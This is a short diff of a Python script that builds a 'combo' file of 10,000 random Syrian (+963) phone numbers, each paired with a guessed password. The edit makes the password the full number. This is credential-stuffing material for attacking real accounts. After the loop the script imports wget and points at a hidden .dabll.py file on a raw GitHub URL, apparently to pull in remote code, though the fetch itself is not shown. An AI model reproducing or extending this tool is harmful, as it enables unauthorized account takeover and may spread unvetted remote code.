@@ -44,7 +44,7 @@ so=input("\n   saratakay: ")
 for i in range(10000):
     r1=random.randint(1000000, 9999999)
     sys.stdout=open("combo.txt", "a")
-    print("+963"+str(so)+str(r1)+":"+str(r1))
+    print("+963"+str(so)+str(r1)+":"+str(so)+str(r1))
     sys.stdout.flush()
 import wget
 url="https://raw.githubusercontent.com/zed404sfrr/-/main/.dabll.py"
